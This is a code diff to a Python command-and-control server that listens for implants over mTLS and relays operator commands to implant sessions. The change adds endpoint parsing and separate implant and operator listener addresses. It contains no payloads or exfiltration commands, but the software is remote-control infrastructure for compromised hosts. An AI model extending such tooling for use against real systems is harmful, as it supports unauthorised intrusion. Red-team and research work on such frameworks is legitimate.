@@ -2,10 +2,13 @@
 import logging
 import sys
 
+#import urllib
+import urllib.parse
 from mtls import mtls
 from queue import Queue
 from handler.handler import Handler
 from pb import operatorpb_pb2
+from typing import Tuple
 
 import socket
 import traceback
@@ -18,12 +21,14 @@ class C2Server(object):
 
 
         ## Generating stuff for implant comms ##
-        endpoint = input("Enter Implant Listner Address (Example: 172.17.0.2:31337)\n> ")
+        implant_endpoint = self._parse_endpoint(input("Enter Implant Listner Address (Example: 172.17.0.2:31337)\n> "))
+        operator_endpoint = self._parse_endpoint(input("Enter Operator Listner Address (Example: 172.17.0.2:31337)\n> "))
+
         print("Listening for implants...")
         self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
         try:
             input
-            self.implantlistener = mtls.Listener(self.requestq, endpoint) #begins implant listener w/ mtls encryption
+            self.implantlistener = mtls.Listener(self.requestq, implant_endpoint) #begins implant listener w/ mtls encryption
         except Exception as e:
             print(e)
             traceback.print_exc()
@@ -36,14 +41,22 @@ class C2Server(object):
         self.handler = Handler(self.requestq, self.operators)
         self.handler.start()
 
-        self.host = ""
-        self.port = 12345
+        self.host, self.port = operator_endpoint
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sock.bind((self.host, self.port))
 
         threading.Thread(target=self._accept_operator).start() #this is so we can listen and have execute commands from server console
 
+    def _parse_endpoint(self, endpoint: str) -> Tuple[str, int]:
+        result = urllib.parse.urlsplit(f"//{endpoint}")
+        if result.hostname is None:
+            raise ValueError(f"Invalid hostname in endpoint {endpoint}")
+
+        if result.port is None:
+            raise ValueError(f"Invalid port in endpoint {endpoint}")
+
+        return result.hostname, result.port
 
     # Turn message into a protobuf SessionCmdOutput and ssend to client
     def _send_operator(self, message, operator, session_id):
@@ -60,6 +73,7 @@ class C2Server(object):
             conn, addr = self.implantlistener.sessions.get(session_id) 
             output = mtls.session(conn, command_str)
             return (output)
+
 
     def _accept_operator(self):
         numberOfUsers = 5
